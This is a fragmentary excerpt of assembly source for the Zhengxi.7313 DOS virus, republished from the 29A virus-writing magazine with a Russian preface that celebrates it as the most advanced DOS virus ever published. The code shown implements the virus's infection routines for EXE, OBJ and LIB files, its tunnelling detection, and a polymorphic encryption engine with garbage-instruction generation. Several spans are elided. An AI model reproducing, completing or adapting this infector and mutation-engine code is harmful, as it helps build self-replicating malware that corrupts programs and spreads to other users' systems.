...
;
;  От вРЕДАКЦИИ: этот исходник мне переслал Eternal Maverick, а он в
;  свою очередь получил его от Векны, который изъял его из забугорного
;  журнала 29A. Посему не удивляйтесь - вступление к исходнику, которое
;  Вы сейчас будете читать, является переводом с английского.
;                                                       Dirty Nazi.
;
;                      ┌───────────────────────┐
;                      │     Zhengxi.7313      │█
...
;
;
; Hаконец-то... исходник самого совершенного ДОС-вируса, который когда-либо
; публиковался в вирусном журнале. И мы рады, что этим счастливым журналом
; оказался 29A :) Вы просмотрите оригинальный исходник лучшей из трех версий
; (7271, 7307, 7313) Zhengxi. Исходный текст, равно как и откомпилированный
; файл, довольно труден для понимания. Тем не менее, я решил оставить ис-
; ходный текст 'как есть'. Сначала я собирался переделать исходник так,
; чтобы он был более удобен для прочтения, но в конце концов решил не
; терять времени и предоставить вам *настоящий* оригинальный исходник,
; чтобы вы могли посмотреть, как автор написал его, прочитать оригинальные
; авторские комментарии (некоторые из них на русском), и так далее.
;
; Оригинальный исходник состоит из ASI, ASM и INC файлов, из-за чего компи-
; лировать вирус сложнее чем его писать :) Вот почему я включил в журнал
; откомпилированный вирус Zhengxi.7313.
;
; Я должен поблагодарить автора этого вируса за то, что он его создал и
; предоставил оригинальный исходник (кстати, кажется, у автора отличное
; чувство юмора :), и друга, который передал этот исходник мне (этот друг
; пожелал не упоминать своего имени). И напоследок, для тех, кто до сих
; пор не знает, что такое Zhengxi (!), ниже помещено очень хорошее
; описание семейства Zhengxi, написанное Евгением Касперским, которому,
; кстати, неплохо было бы часть тех бабок, которые он заколачивает на
; продаже AVP, потратить на курсы по обучению английскому языку :)
;
; ──┤ Zhengxi family ├─────────────────────────────────────────────────────
;
...
;    cld
    ...
    mov     ah, 2Ah  ; получить текущую дату и ......
    call    doscall
    xor     dx, [host_arx_date]    ;не заражать файлы этой недели
    and     dx, 18h ;week only         ; искл. создаваемые файлы (?)
    DOIF NZ
        call    arxtest
    DONE
...
;; не заражать EXE файлы без релокейшенов,
;и если релокейшенов очень много (?)
    cmp     byte ptr [exehdr.exe_rle_count], 1 ;0 or 1 relocations
    jb     $$ret
;................................

;; если длина загружаемой части exeшника больше ... 32k = 40h pages
...
pblabel no_freq_proc
    ...
    cmp     ax, INTERVAL_INFECT ;0.5 мин
IFDEF RELIZ
...
pblabel standart_exe_infect
    ...
    test      al, 1
    jnz       endd       ;не заражать EXEфайлы с нечетной длиной
...
;write old header to EOF
    ...
    call    calc_hdr_pages
;уменьшить MinMem на размер оверлея (?)
    sub     di, [exehdr.exe_pages] ;отриц.
    shl     di, 5
...
;-+-[process 98]-------------+-
    ...
    jnz     obj$ret1
    test    byte ptr [objhdr.segattr], 0A0h
            ;borland windows library is WORD alignment
...
;может осыпаться, если увеличить размер вируса. сейчас 7000
;надо, чтобы было 9 блоков.?
;mov ax, cx
;add ax, 3DFh
;dec ax
;cwd
...
; тк заражение LIB занимает много времени
; это стоит делать при работе NDD, PKLITE, TLINK, etc
    ...
    DO                                    ;infect exitcode of 'C' program
        ...
        call    calculate_crc    ;<add si,3
;; заражение '___write', '__ioalloc_' итп
...
;в словаре: для всех записей > exit_ добавить размер вставки в параграфах
;seek (lib_hdr_dict_offs)
    ...
    DO
        ...
        cmp     ax, dx                  ; потом сделай через SAHF
        jne     end_process_dictionary  ;< после этого надо-бы
        call    dosseek_cur_neg_dx      ; стрункейтить extended dictionary
        lea     si, [heap]              ; process:)
        mov     cx, 25h
        DO
            lodsb
...
@@0:
        ...
        CYCLE
@@1:
        pop     ax ;drop DI  ;        ;если директория +name
    CYCLE
...
pblabel p1
    ...
    jne     __retn
tunnel_detect:
;это выполняется только при первой установке вируса в память
...
pblabel DosCall_exc
    ...
    call    DosCall
    jnc    $$ret    ;обработка ошибок ДОСа (?)
;int 2bh
;    cmp    [close_on_error], 3eh ;3e-no close
;    DOIF NE
;        call dosclose
;    DONE
    jmp rt_err  ; восстановить SP и вернуться в userproc
;-+--------------------------------------------------------------------+-
...
pblabel ffound
    ...
    call    RND_GET_BYTE        
    ; X < decriptor_data + initialIP
    mov     [engdata.value_X],ax
    ; or X > decriptor_data+initialIP+datasize+2

    call    RND_GET_BYTE         
    ; Y < decriptor_data + initialIP - X
    mov     [engdata.value_Y],ax 
    ; or Y > decriptor_data+initialIP+datasize+2-X
...
;────────────────────────────────────────────────────────────────────────
    mov     [engdata.useregs], REG_GARBL_ALL        ;
    mov     [engdata.begin_sub], 0
            ;DON'T ENCODE CALL BACKWARD INTO DECRYPTOR
...
pblabel force_choice_crypt_operation
    ...
    DOIF Z
        ...
        mov     ah, [engdata.lastchoose]
                      ;lastchoose=1, 2, 3 │ -1 │ ax, cx, dx,
...
pblabel not_branch_garble                  ;
    DO                          ; get random INSTRUCTION
        ...
        cmp     al, [engdata.lastgarble] 
                                ; then try again, we don't want two
    CYCLE E                     ; of the same sort in a row
pblabel force_not_branch_garble
    mov     [engdata.lastgarble], al 
                                ; else remember this one and process it
;-------------------------------------------------------------------
...
dop macro   highopcode, shiftneg, lowpcode, twohalf, secdlim
    db highopcode or shiftneg, lowpcode or ((twohalf shl 2) and 4) or
    secdlim endm
;------------------------------------------------------------------------
...
;┌───── Auxiliary (implementation) macros ─────┐
